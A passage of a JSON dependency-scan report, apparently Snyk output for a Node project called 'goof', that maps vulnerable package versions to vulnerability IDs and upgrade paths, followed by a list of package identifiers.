        }
      }
    },
    {
      "type": "remedies",
      "id": "qs@2.4.2:SNYK-JS-QS-3153490",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "qs",
                "version": "2.4.2",
                "new_version": "6.2.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "qs@2.4.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-QS-3153490"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "qs@2.4.2:npm:qs:20170213",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "qs",
                "version": "2.4.2",
                "new_version": "6.0.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "qs@2.4.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:qs:20170213"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "qs@6.3.2:SNYK-JS-QS-3153490",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "qs",
                "version": "6.3.2",
                "new_version": "6.3.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "qs@6.3.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-QS-3153490"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "request@2.42.0:SNYK-JS-REQUEST-3361831",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "request@2.42.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-REQUEST-3361831"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "request@2.42.0:npm:request:20160119",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "request",
                "version": "2.42.0",
                "new_version": "2.68.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "request@2.42.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:request:20160119"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "request@2.79.0:SNYK-JS-REQUEST-3361831",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "request@2.79.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-REQUEST-3361831"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "semver@1.1.4:SNYK-JS-SEMVER-3247795",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "semver",
                "version": "1.1.4",
                "new_version": "5.7.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "semver@1.1.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SEMVER-3247795"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "semver@1.1.4:npm:semver:20150403",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "semver",
                "version": "1.1.4",
                "new_version": "4.3.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "semver@1.1.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:semver:20150403"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "semver@5.1.0:SNYK-JS-SEMVER-3247795",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "semver",
                "version": "5.1.0",
                "new_version": "5.7.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "semver@5.1.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SEMVER-3247795"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "semver@5.7.0:SNYK-JS-SEMVER-3247795",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "semver",
                "version": "5.7.0",
                "new_version": "5.7.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "semver@5.7.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SEMVER-3247795"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "semver@6.3.0:SNYK-JS-SEMVER-3247795",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "semver",
                "version": "6.3.0",
                "new_version": "6.3.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "semver@6.3.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SEMVER-3247795"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "snyk-docker-plugin@1.38.0:SNYK-JS-SNYKDOCKERPLUGIN-3039679",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "snyk-docker-plugin",
                "version": "1.38.0",
                "new_version": "5.6.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "snyk-docker-plugin@1.38.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKDOCKERPLUGIN-3039679"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "snyk-go-plugin@1.11.1:SNYK-JS-SNYKGOPLUGIN-3037316",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "snyk-go-plugin",
                "version": "1.11.1",
                "new_version": "1.19.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "snyk-go-plugin@1.11.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKGOPLUGIN-3037316"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "snyk-gradle-plugin@3.2.4:SNYK-JS-SNYKGRADLEPLUGIN-3038624",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "snyk-gradle-plugin",
                "version": "3.2.4",
                "new_version": "3.24.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "snyk-gradle-plugin@3.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKGRADLEPLUGIN-3038624"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "snyk-mvn-plugin@2.8.0:SNYK-JS-SNYKMVNPLUGIN-3038623",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "snyk-mvn-plugin",
                "version": "2.8.0",
                "new_version": "2.31.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "snyk-mvn-plugin@2.8.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKMVNPLUGIN-3038623"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "snyk-python-plugin@1.17.0:SNYK-JS-SNYKPYTHONPLUGIN-3039677",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "snyk-python-plugin",
                "version": "1.17.0",
                "new_version": "1.24.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "snyk-python-plugin@1.17.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKPYTHONPLUGIN-3039677"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "snyk-sbt-plugin@2.11.0:SNYK-JS-SNYKSBTPLUGIN-3038626",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "snyk-sbt-plugin",
                "version": "2.11.0",
                "new_version": "2.16.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "snyk-sbt-plugin@2.11.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKSBTPLUGIN-3038626"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "snyk@1.290.2:SNYK-JS-SNYK-3037342",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "snyk",
                "version": "1.290.2",
                "new_version": "1.996.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "snyk@1.290.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYK-3037342"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "snyk@1.290.2:SNYK-JS-SNYK-3038622",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "snyk",
                "version": "1.290.2",
                "new_version": "1.1064.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "snyk@1.290.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYK-3038622"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "snyk@1.290.2:SNYK-JS-SNYK-3111871",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "snyk",
                "version": "1.290.2",
                "new_version": "1.1064.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "snyk@1.290.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYK-3111871"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "st@0.2.4:npm:st:20140206",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "st",
                "version": "0.2.4",
                "new_version": "0.2.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "st@0.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:st:20140206"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "st@0.2.4:npm:st:20171013",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "st",
                "version": "0.2.4",
                "new_version": "1.2.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "st@0.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:st:20171013"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "symbol@0.2.3:snyk:lic:npm:symbol:MPL-2.0",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "symbol@0.2.3"
          }
        },
        "license_issue": {
          "data": {
            "type": "license_issues",
            "id": "snyk:lic:npm:symbol:MPL-2.0"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "tough-cookie@2.3.4:SNYK-JS-TOUGHCOOKIE-5672873",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "tough-cookie",
                "version": "2.3.4",
                "new_version": "4.1.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "tough-cookie@2.3.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-TOUGHCOOKIE-5672873"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "tough-cookie@3.0.1:SNYK-JS-TOUGHCOOKIE-5672873",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "tough-cookie",
                "version": "3.0.1",
                "new_version": "4.1.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "tough-cookie@3.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-TOUGHCOOKIE-5672873"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "tunnel-agent@0.4.3:npm:tunnel-agent:20170305",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "tunnel-agent",
                "version": "0.4.3",
                "new_version": "0.6.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "tunnel-agent@0.4.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:tunnel-agent:20170305"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "uglify-js@2.6.2:SNYK-JS-UGLIFYJS-1727251",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "uglify-js",
                "version": "2.6.2",
                "new_version": "3.14.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "uglify-js@2.6.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-UGLIFYJS-1727251"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "underscore@1.9.1:SNYK-JS-UNDERSCORE-1080984",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "underscore",
                "version": "1.9.1",
                "new_version": "1.12.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "underscore@1.9.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-UNDERSCORE-1080984"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "word-wrap@1.2.3:SNYK-JS-WORDWRAP-3149973",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "word-wrap",
                "version": "1.2.3",
                "new_version": "1.2.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "word-wrap@1.2.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-WORDWRAP-3149973"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "xml2js@0.4.19:SNYK-JS-XML2JS-5414874",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "xml2js",
                "version": "0.4.19",
                "new_version": "0.5.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "xml2js@0.4.19"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-XML2JS-5414874"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "xml2js@0.4.23:SNYK-JS-XML2JS-5414874",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "xml2js",
                "version": "0.4.23",
                "new_version": "0.5.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "xml2js@0.4.23"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-XML2JS-5414874"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "y18n@3.2.1:SNYK-JS-Y18N-1021887",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "y18n",
                "version": "3.2.1",
                "new_version": "3.2.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "y18n@3.2.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-Y18N-1021887"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "yargs-parser@2.4.0:SNYK-JS-YARGSPARSER-560381",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "yargs-parser",
                "version": "2.4.0",
                "new_version": "5.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "yargs-parser@2.4.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-YARGSPARSER-560381"
          }
        }
      }
    },
    {
      "id": "@snyk/snyk-cocoapods-plugin@2.0.1",
      "type": "packages",
      "attributes": {
        "name": "@snyk/snyk-cocoapods-plugin",
        "version": "2.0.1",
        "purl": "pkg:npm/%40snyk/snyk-cocoapods-plugin@2.0.1"
      }
    },
    {
      "id": "acorn@5.7.1",
      "type": "packages",
      "attributes": {
        "name": "acorn",
        "version": "5.7.1",
        "purl": "pkg:npm/acorn@5.7.1"
      }
    },
    {
      "id": "adm-zip@0.4.11",
      "type": "packages",
      "attributes": {
        "name": "adm-zip",
        "version": "0.4.11",
        "purl": "pkg:npm/adm-zip@0.4.11"
      }
    },
    {
      "id": "ansi-regex@2.1.1",
      "type": "packages",
      "attributes": {
        "name": "ansi-regex",
        "version": "2.1.1",
        "purl": "pkg:npm/ansi-regex@2.1.1"
      }
    },
    {
      "id": "ansi-regex@3.0.0",
      "type": "packages",
      "attributes": {
        "name": "ansi-regex",
        "version": "3.0.0",
        "purl": "pkg:npm/ansi-regex@3.0.0"
      }
    },
    {
      "id": "ansi-regex@4.1.0",
      "type": "packages",
      "attributes": {
        "name": "ansi-regex",
        "version": "4.1.0",
        "purl": "pkg:npm/ansi-regex@4.1.0"
      }
    },
    {
      "id": "bl@0.9.5",
      "type": "packages",
      "attributes": {
        "name": "bl",
        "version": "0.9.5",
        "purl": "pkg:npm/bl@0.9.5"
      }
    },
    {
      "id": "bl@3.0.0",
      "type": "packages",
      "attributes": {
        "name": "bl",
        "version": "3.0.0",
        "purl": "pkg:npm/bl@3.0.0"
      }
    },
    {
      "id": "brace-expansion@1.1.4",
      "type": "packages",
      "attributes": {
        "name": "brace-expansion",
        "version": "1.1.4",
        "purl": "pkg:npm/brace-expansion@1.1.4"
      }
    },
    {
      "id": "braces@1.8.5",
      "type": "packages",
      "attributes": {
        "name": "braces",
        "version": "1.8.5",
        "purl": "pkg:npm/braces@1.8.5"
      }
    },
    {
      "id": "cli@0.6.6",
      "type": "packages",
      "attributes": {
        "name": "cli",
        "version": "0.6.6",
        "purl": "pkg:npm/cli@0.6.6"
      }
    },
    {
      "id": "debug@2.2.0",
      "type": "packages",
      "attributes": {
        "name": "debug",
        "version": "2.2.0",
        "purl": "pkg:npm/debug@2.2.0"
      }
    },
    {
      "id": "debug@3.2.6",
      "type": "packages",
      "attributes": {
        "name": "debug",
        "version": "3.2.6",
        "purl": "pkg:npm/debug@3.2.6"
      }
    },
    {
      "id": "debug@4.1.1",
      "type": "packages",
      "attributes": {
        "name": "debug",
        "version": "4.1.1",
        "purl": "pkg:npm/debug@4.1.1"
      }
    },
    {
      "id": "dicer@0.3.0",
      "type": "packages",
      "attributes": {
        "name": "dicer",
        "version": "0.3.0",
        "purl": "pkg:npm/dicer@0.3.0"
      }
    },
    {
      "id": "dustjs-linkedin@2.6.0",
      "type": "packages",
      "attributes": {
        "name": "dustjs-linkedin",
        "version": "2.6.0",
        "purl": "pkg:npm/dustjs-linkedin@2.6.0"
      }
    },
    {
      "id": "ejs@0.8.8",
      "type": "packages",
      "attributes": {
        "name": "ejs",
        "version": "0.8.8",
        "purl": "pkg:npm/ejs@0.8.8"
      }
    },
    {
      "id": "ejs@1.0.0",
      "type": "packages",
      "attributes": {
        "name": "ejs",
        "version": "1.0.0",
        "purl": "pkg:npm/ejs@1.0.0"
      }
    },
    {
      "id": "express-fileupload@0.0.5",
      "type": "packages",
      "attributes": {
        "name": "express-fileupload",
        "version": "0.0.5",
        "purl": "pkg:npm/express-fileupload@0.0.5"
      }
    },
    {
      "id": "express@4.12.4",
      "type": "packages",
      "attributes": {
        "name": "express",
        "version": "4.12.4",
        "purl": "pkg:npm/express@4.12.4"
      }
    },
    {
      "id": "fresh@0.2.4",
      "type": "packages",
      "attributes": {
        "name": "fresh",
        "version": "0.2.4",
        "purl": "pkg:npm/fresh@0.2.4"
      }
    },
    {
      "id": "goof@1.0.1",
      "type": "packages",
      "attributes": {
        "name": "goof",
        "version": "1.0.1",
        "purl": "pkg:npm/goof@1.0.1"
      }
    },
    {
      "id": "got@6.7.1",
      "type": "packages",
      "attributes": {
        "name": "got",
        "version": "6.7.1",
        "purl": "pkg:npm/got@6.7.1"
      }
    },
    {
      "id": "handlebars@4.0.5",
      "type": "packages",
      "attributes": {
        "name": "handlebars",
        "version": "4.0.5",
        "purl": "pkg:npm/handlebars@4.0.5"
      }
    },
    {
      "id": "hawk@1.1.1",
      "type": "packages",
      "attributes": {
        "name": "hawk",
        "version": "1.1.1",
        "purl": "pkg:npm/hawk@1.1.1"
      }
    },
    {
      "id": "hawk@3.1.3",
      "type": "packages",
      "attributes": {
        "name": "hawk",
        "version": "3.1.3",
        "purl": "pkg:npm/hawk@3.1.3"
      }
    },
    {
      "id": "hoek@0.9.1",
      "type": "packages",
      "attributes": {
        "name": "hoek",
        "version": "0.9.1",
        "purl": "pkg:npm/hoek@0.9.1"
      }
    },
    {
      "id": "hoek@2.16.3",
      "type": "packages",
      "attributes": {
        "name": "hoek",
        "version": "2.16.3",
        "purl": "pkg:npm/hoek@2.16.3"
      }
    },
    {
      "id": "hosted-git-info@2.1.5",
      "type": "packages",
      "attributes": {
        "name": "hosted-git-info",
        "version": "2.1.5",
        "purl": "pkg:npm/hosted-git-info@2.1.5"
      }
    },
    {
      "id": "hosted-git-info@2.8.5",
      "type": "packages",
      "attributes": {
        "name": "hosted-git-info",
        "version": "2.8.5",
        "purl": "pkg:npm/hosted-git-info@2.8.5"
      }
    },
    {
      "id": "http-signature@0.10.1",
      "type": "packages",
      "attributes": {
        "name": "http-signature",
        "version": "0.10.1",
        "purl": "pkg:npm/http-signature@0.10.1"
      }
    },
    {
      "id": "inflight@1.0.5",
      "type": "packages",
      "attributes": {
        "name": "inflight",
        "version": "1.0.5",
        "purl": "pkg:npm/inflight@1.0.5"
      }
    },
    {
      "id": "inflight@1.0.6",
      "type": "packages",
      "attributes": {
        "name": "inflight",
        "version": "1.0.6",
        "purl": "pkg:npm/inflight@1.0.6"
      }
    },
    {
      "id": "ini@1.1.0",
      "type": "packages",
      "attributes": {
        "name": "ini",
        "version": "1.1.0",
        "purl": "pkg:npm/ini@1.1.0"
      }
    },
    {
      "id": "ini@1.3.5",
      "type": "packages",
      "attributes": {
        "name": "ini",
        "version": "1.3.5",
        "purl": "pkg:npm/ini@1.3.5"
      }
    },
    {
      "id": "ip@1.1.5",
      "type": "packages",
      "attributes": {
        "name": "ip",
        "version": "1.1.5",
        "purl": "pkg:npm/ip@1.1.5"
      }
    },
    {
      "id": "is-my-json-valid@2.19.0",
      "type": "packages",
      "attributes": {
        "name": "is-my-json-valid",
        "version": "2.19.0",
        "purl": "pkg:npm/is-my-json-valid@2.19.0"
      }
    },
    {
      "id": "jquery@2.2.4",
      "type": "packages",
      "attributes": {
        "name": "jquery",
        "version": "2.2.4",
        "purl": "pkg:npm/jquery@2.2.4"
      }
    },
    {
      "id": "js-yaml@3.6.1",
      "type": "packages",
      "attributes": {
        "name": "js-yaml",
        "version": "3.6.1",
        "purl": "pkg:npm/js-yaml@3.6.1"
      }
    },
    {
      "id": "json-schema@0.2.3",
      "type": "packages",
      "attributes": {
        "name": "json-schema",
        "version": "0.2.3",
        "purl": "pkg:npm/json-schema@0.2.3"
      }
    },
    {
      "id": "jsonpointer@4.0.1",
      "type": "packages",
      "attributes": {
        "name": "jsonpointer",
        "version": "4.0.1",
        "purl": "pkg:npm/jsonpointer@4.0.1"
      }
    },
    {
      "id": "jszip@3.2.2",
      "type": "packages",
      "attributes": {
        "name": "jszip",
        "version": "3.2.2",
        "purl": "pkg:npm/jszip@3.2.2"
      }
    },
    {
      "id": "kerberos@0.0.24",
      "type": "packages",
      "attributes": {
        "name": "kerberos",
        "version": "0.0.24",
        "purl": "pkg:npm/kerberos@0.0.24"
      }
    },
    {
      "id": "lodash.set@4.3.2",
      "type": "packages",
      "attributes": {
        "name": "lodash.set",
        "version": "4.3.2",
        "purl": "pkg:npm/lodash.set@4.3.2"
      }
    },
    {
      "id": "lodash@4.17.15",
      "type": "packages",
      "attributes": {
        "name": "lodash",
        "version": "4.17.15",
        "purl": "pkg:npm/lodash@4.17.15"
      }
    },
    {
      "id": "lodash@4.17.4",
      "type": "packages",
      "attributes": {
        "name": "lodash",
        "version": "4.17.4",
        "purl": "pkg:npm/lodash@4.17.4"
      }
    },
    {
      "id": "marked@0.3.5",
      "type": "packages",
      "attributes": {
        "name": "marked",
        "version": "0.3.5",
        "purl": "pkg:npm/marked@0.3.5"
      }
    },
    {
      "id": "micromatch@2.3.8",
      "type": "packages",
      "attributes": {
        "name": "micromatch",
        "version": "2.3.8",
        "purl": "pkg:npm/micromatch@2.3.8"
      }
    },
    {
      "id": "mime@1.2.11",
      "type": "packages",
      "attributes": {
        "name": "mime",
        "version": "1.2.11",
        "purl": "pkg:npm/mime@1.2.11"
      }
    },
    {
      "id": "mime@1.3.4",
      "type": "packages",
      "attributes": {
        "name": "mime",
        "version": "1.3.4",
        "purl": "pkg:npm/mime@1.3.4"
      }
    },
    {
      "id": "minimatch@0.3.0",
      "type": "packages",
      "attributes": {
        "name": "minimatch",
        "version": "0.3.0",
        "purl": "pkg:npm/minimatch@0.3.0"
      }
    },
    {
      "id": "minimatch@2.0.10",
      "type": "packages",
      "attributes": {
        "name": "minimatch",
        "version": "2.0.10",
        "purl": "pkg:npm/minimatch@2.0.10"
      }
    },
    {
      "id": "minimatch@3.0.0",
      "type": "packages",
      "attributes": {
        "name": "minimatch",
        "version": "3.0.0",
        "purl": "pkg:npm/minimatch@3.0.0"
      }
    },
    {
      "id": "minimatch@3.0.4",
      "type": "packages",
      "attributes": {
        "name": "minimatch",
        "version": "3.0.4",
        "purl": "pkg:npm/minimatch@3.0.4"
      }
    },
    {
      "id": "minimist@0.0.10",
      "type": "packages",
      "attributes": {
        "name": "minimist",
        "version": "0.0.10",
        "purl": "pkg:npm/minimist@0.0.10"
      }
    },
    {
      "id": "minimist@0.0.8",
      "type": "packages",
      "attributes": {
        "name": "minimist",
        "version": "0.0.8",
        "purl": "pkg:npm/minimist@0.0.8"
      }
    },
    {
      "id": "minimist@1.2.0",
      "type": "packages",
      "attributes": {
        "name": "minimist",
        "version": "1.2.0",
        "purl": "pkg:npm/minimist@1.2.0"
      }
    },
    {
      "id": "moment@2.15.1",
      "type": "packages",
      "attributes": {
        "name": "moment",
        "version": "2.15.1",
        "purl": "pkg:npm/moment@2.15.1"
      }
    },
    {
      "id": "mongodb@2.0.46",
      "type": "packages",
      "attributes": {
        "name": "mongodb",
        "version": "2.0.46",
        "purl": "pkg:npm/mongodb@2.0.46"
      }
    },
    {
      "id": "mongoose@4.2.4",
      "type": "packages",
      "attributes": {
        "name": "mongoose",
        "version": "4.2.4",
        "purl": "pkg:npm/mongoose@4.2.4"
      }
    },
    {
      "id": "mpath@0.1.1",
      "type": "packages",
      "attributes": {
        "name": "mpath",
        "version": "0.1.1",
